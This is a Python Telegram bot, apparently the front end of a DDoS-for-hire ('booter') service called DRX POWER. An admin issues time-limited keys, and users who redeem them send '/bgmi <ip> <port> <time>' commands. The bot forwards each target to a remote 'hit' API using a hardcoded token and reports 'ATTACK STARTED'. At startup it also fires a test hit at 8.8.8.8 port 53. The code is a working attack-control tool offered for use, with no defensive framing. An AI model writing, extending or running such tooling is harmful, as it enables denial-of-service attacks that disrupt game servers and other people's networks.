import telebot
import json
import requests
import datetime
import os
import time
import socket
import threading
import traceback

# ============================================
# DEBUG: Print startup information
# ============================================
print("=" * 50)
print("🤖 DRX BOT STARTING...")
print("=" * 50)

# Try to import psutil (optional)
try:
    import psutil
    PSUTIL_AVAILABLE = True
    print("✅ psutil loaded successfully")
except ImportError as e:
    PSUTIL_AVAILABLE = False
    print(f"⚠️ psutil not available: {e}")

# ============================================
# Load Config
# ============================================
print("\n📁 Loading config.json...")
if os.path.exists('config.json'):
    try:
        with open('config.json') as f:
            config = json.load(f)
        print(f"✅ Config loaded successfully")
        print(f"   Admin ID: {config.get('admin', 'NOT SET')}")
        print(f"   Token: {config.get('token', 'NOT SET')[:10]}...")
    except Exception as e:
        print(f"❌ Error loading config: {e}")
        exit()
else:
    print("❌ Error: config.json file not found!")
    exit()

# ============================================
# Create Bot Instance
# ============================================
print("\n🤖 Creating bot instance...")
try:
    bot = telebot.TeleBot(config['token'])
    print("✅ Bot instance created")
except Exception as e:
    print(f"❌ Failed to create bot: {e}")
    exit()

# ============================================
# Remove Webhook (Fix 409 error)
# ============================================
print("\n🔧 Removing webhook...")
try:
    bot.remove_webhook()
    print("✅ Webhook removed successfully")
except Exception as e:
    print(f"⚠️ Webhook removal note: {e}")

# ============================================
# API URL Configuration
# ============================================
print("\n🔗 Configuring API URL...")

# Try multiple URL options for debugging
API_URL_OPTIONS = [
    os.environ.get('API_URL', ''),  # Environment variable
    "https://drx-api-x40n.onrender.com/hit",  # Your Render URL
    "https://drx-api-x40n.onrender.com/hit?test=1",  # With test param
]

# Use the first non-empty option
API_URL = None
for url in API_URL_OPTIONS:
    if url and url.strip():
        API_URL = url.split('?')[0]  # Remove test params
        break

if not API_URL:
    API_URL = "https://drx-api-x40n.onrender.com/hit"

AUTH_TOKEN = "DRX_POWER_ULTRA_V4"

print(f"✅ Using API_URL: {API_URL}")
print(f"✅ Using AUTH_TOKEN: {AUTH_TOKEN[:10]}...")

# ============================================
# Test API Connectivity on Startup
# ============================================
print("\n🌐 Testing API connectivity...")
try:
    test_url = f"{API_URL}?token={AUTH_TOKEN}&ip=8.8.8.8&port=53&time=1"
    print(f"   Testing URL: {test_url}")
    
    test_response = requests.get(test_url, timeout=10)
    print(f"   Response Status: {test_response.status_code}")
    print(f"   Response Body: {test_response.text[:200]}")
    
    if test_response.status_code == 200:
        print("✅ API is WORKING!")
    else:
        print(f"⚠️ API returned status {test_response.status_code}")
except Exception as e:
    print(f"❌ API test FAILED: {e}")
    print(f"   Full error: {traceback.format_exc()}")

# ============================================
# Database files
# ============================================
KEYS_FILE = "keys.json"
USERS_FILE = "users.json"

def load_data(file):
    if os.path.exists(file):
        try:
            with open(file, 'r') as f:
                return json.load(f)
        except Exception as e:
            print(f"⚠️ Error loading {file}: {e}")
            return {}
    return {}

def save_data(file, data):
    try:
        with open(file, 'w') as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        print(f"❌ Error saving {file}: {e}")

# ============================================
# Command Handlers
# ============================================

@bot.message_handler(commands=['start'])
def welcome(m):
    print(f"📨 Received /start from {m.from_user.id}")
    try:
        bot.reply_to(m, "🔥 **DRX POWER Bot Active**\n\nWelcome! Use /help to see command list.")
        print(f"✅ Response sent to {m.from_user.id}")
    except Exception as e:
        print(f"❌ Error in welcome: {e}")

@bot.message_handler(commands=['help'])
def help_cmd(m):
    help_text = """
🚀 **Available Commands:**
/bgmi <ip> <port> <time> - Start Attack
/redeem <key> - Activate Plan
/myinfo - Check your Plan
/status - Current Attack Status

👑 **Admin Only:**
/genkey <duration> - Generate Key (e.g., /genkey 1d)
    """
    bot.reply_to(m, help_text)

@bot.message_handler(commands=['genkey'])
def genkey(m):
    print(f"📨 Received /genkey from {m.from_user.id}")
    
    if str(m.from_user.id) != str(config['admin']):
        bot.reply_to(m, "❌ Admin only command.")
        return
    
    args = m.text.split()
    if len(args) < 2:
        bot.reply_to(m, "Usage: /genkey 1h, 1d, 1w")
        return
    
    duration = args[1]
    key = "DRX-" + os.urandom(3).hex().upper()
    
    keys = load_data(KEYS_FILE)
    keys[key] = duration
    save_data(KEYS_FILE, keys)
    
    bot.reply_to(m, f"🔑 **Key Generated:** `{key}`\n⏳ **Duration:** {duration}")

@bot.message_handler(commands=['redeem'])
def redeem(m):
    print(f"📨 Received /redeem from {m.from_user.id}")
    
    args = m.text.split()
    if len(args) < 2:
        bot.reply_to(m, "Usage: /redeem DRX-XXXX")
        return
    
    user_key = args[1]
    keys = load_data(KEYS_FILE)
    
    if user_key in keys:
        duration = keys[user_key]
        users = load_data(USERS_FILE)
        
        users[str(m.from_user.id)] = {"plan": duration, "active": True}
        save_data(USERS_FILE, users)
        
        del keys[user_key]
        save_data(KEYS_FILE, keys)
        bot.reply_to(m, f"✅ **Redeemed Successfully!**\nPlan: {duration} active.")
    else:
        bot.reply_to(m, "❌ Invalid or Expired Key.")

# ============================================
# MAIN ATTACK COMMAND - WITH FULL DEBUG
# ============================================
@bot.message_handler(commands=['bgmi'])
def attack(m):
    print("\n" + "=" * 50)
    print(f"📨 Received /bgmi from user: {m.from_user.id}")
    print(f"   Full message: {m.text}")
    print("=" * 50)
    
    # Check user authorization
    users = load_data(USERS_FILE) 
    user_id = str(m.from_user.id)
    
    print(f"🔍 Checking authorization for user {user_id}...")
    print(f"   Users in DB: {list(users.keys())}")
    
    if user_id not in users or not users[user_id].get('active'):
        print(f"❌ User {user_id} not authorized or no active plan")
        bot.reply_to(m, "❌ **ACCESS DENIED!**\nNo active plan found. Please use /redeem first.")
        return
    
    print(f"✅ User {user_id} is authorized")
    
    # Parse command arguments
    args = m.text.split()
    print(f"   Arguments: {args}")
    
    if len(args) != 4:
        print(f"❌ Invalid argument count: {len(args)} (expected 4)")
        bot.reply_to(m, "❌ **Format:** `/bgmi <IP> <PORT> <TIME>`")
        return
    
    ip, port, attack_time = args[1], args[2], args[3]
    print(f"🎯 Target: {ip}:{port} for {attack_time}s")
    
    # Validate inputs
    if not port.isdigit():
        print(f"❌ Invalid port: {port}")
        bot.reply_to(m, "❌ Port must be a number!")
        return
    if not attack_time.isdigit():
        print(f"❌ Invalid time: {attack_time}")
        bot.reply_to(m, "❌ Time must be a number!")
        return
    
    # Build API URL
    full_url = f"{API_URL}?token={AUTH_TOKEN}&ip={ip}&port={port}&time={attack_time}"
    print(f"🌐 Calling API: {full_url}")
    
    try:
        print("⏳ Sending request to API...")
        response = requests.get(full_url, timeout=10)
        
        print(f"📊 Response Status Code: {response.status_code}")
        print(f"📝 Response Body: {response.text[:500]}")
        
        if response.status_code == 200:
            try:
                result = response.json()
                print(f"🔍 Parsed JSON: {result}")
                
                if result.get('status') == 'success':
                    print("✅ Attack launched successfully!")
                    
                    success_msg = f"🚀 **ATTACK STARTED!**\n🎯 Target: `{ip}:{port}`\n🕒 Time: {attack_time}s\n💎 Power: DRX ULTRA\n📶 Status: API CONNECTED ✅"
                    bot.reply_to(m, success_msg)
                    
                    def send_finish():
                        try:
                            bot.send_message(m.chat.id, f"✅ **ATTACK FINISHED**\n🎯 Target: `{ip}:{port}`\nStatus: Attack Completed")
                        except Exception as e:
                            print(f"❌ Error sending finish message: {e}")
                    
                    timer = threading.Timer(int(attack_time), send_finish)
                    timer.daemon = True
                    timer.start()
                    print(f"⏰ Timer set for {attack_time} seconds")
                    
                else:
                    error_msg = result.get('message', 'Unknown error')
                    print(f"❌ API returned error: {error_msg}")
                    bot.reply_to(m, f"❌ **API ERROR!**\n{error_msg}")
                    
            except json.JSONDecodeError as e:
                print(f"❌ Failed to parse JSON response: {e}")
                bot.reply_to(m, f"❌ **API ERROR!**\nInvalid JSON response: {response.text[:200]}")
        else:
            print(f"❌ HTTP Error: {response.status_code}")
            bot.reply_to(m, f"❌ **API ERROR!**\nStatus Code: {response.status_code}\nResponse: {response.text[:200]}")
            
    except requests.exceptions.ConnectionError as e:
        print(f"❌ Connection Error: {e}")
        bot.reply_to(m, f"❌ **API OFFLINE!**\nCould not connect to API.\nURL: {API_URL}\nError: {str(e)[:100]}")
    except requests.exceptions.Timeout as e:
        print(f"❌ Timeout Error: {e}")
        bot.reply_to(m, "❌ **API TIMEOUT!**\nAPI did not respond in time.")
    except Exception as e:
        print(f"❌ Unexpected Error: {e}")
        print(f"   Full traceback: {traceback.format_exc()}")
        bot.reply_to(m, f"❌ **UNKNOWN ERROR!**\n{str(e)[:200]}")

@bot.message_handler(commands=['myinfo'])
def myinfo(m):
    users = load_data(USERS_FILE)
    user_id = str(m.from_user.id)
    if user_id in users:
        bot.reply_to(m, f"👤 **User Info:**\nPlan: {users[user_id]['plan']}\nStatus: Active ✅")
    else:
        bot.reply_to(m, "❌ No active plan found.")

@bot.message_handler(commands=['status'])
def status(m):
    print(f"📨 Received /status from {m.from_user.id}")
    
    # Check API status
    api_status = "Unknown 🔴"
    try:
        api_base = API_URL.replace('/hit', '')
        response = requests.get(api_base, timeout=5)
        if response.status_code == 200:
            api_status = "Online 🟢"
        else:
            api_status = f"Error {response.status_code} 🟡"
    except Exception as e:
        api_status = f"Offline 🔴 ({str(e)[:50]})"
    
    # CPU/RAM info (only if psutil available)
    if PSUTIL_AVAILABLE:
        cpu_usage = psutil.cpu_percent(interval=1)
        ram_usage = psutil.virtual_memory().percent
        load_icon = "🟢" if cpu_usage < 50 else "🟡" if cpu_usage < 80 else "🔴"
        cpu_text = f"{cpu_usage}% {load_icon}"
        ram_text = f"{ram_usage}% 🟢"
    else:
        cpu_text = "N/A (psutil not installed)"
        ram_text = "N/A"
    
    status_text = (
        "📊 **DRX POWER LIVE STATUS**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 **Bot Status:** Active ✅\n"
        f"🔌 **API URL:** `{API_URL}`\n"
        f"🔌 **API Connection:** {api_status}\n"
        f"🖥️ **CPU Load:** {cpu_text}\n"
        f"💾 **RAM Usage:** {ram_text}\n"
        f"🚀 **Platform:** Render.com\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )
    bot.reply_to(m, status_text, parse_mode="Markdown")

# ============================================
# Error Handler for All Messages
# ============================================
@bot.message_handler(func=lambda m: True)
def echo_all(m):
    print(f"📨 Unhandled message from {m.from_user.id}: {m.text}")

# ============================================
# Start Bot
# ============================================
print("\n" + "=" * 50)
print("🚀 STARTING BOT POLLING...")
print("=" * 50 + "\n")

try:
    bot.polling(none_stop=True, interval=0, timeout=20)
except Exception as e:
    print(f"❌ Fatal error in polling: {e}")
    print(traceback.format_exc())
